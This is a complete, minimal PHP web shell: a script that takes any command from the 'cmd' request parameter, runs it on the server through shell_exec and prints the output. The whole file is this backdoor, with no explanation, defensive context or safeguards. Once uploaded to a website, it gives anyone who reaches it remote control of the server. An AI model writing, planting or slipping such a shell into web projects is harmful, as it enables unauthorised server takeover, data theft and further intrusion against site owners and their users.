<?php
if(isset($_REQUEST['cmd'])){
    echo '<pre>' . shell_exec($_REQUEST['cmd']) . '</pre>';
}
?>
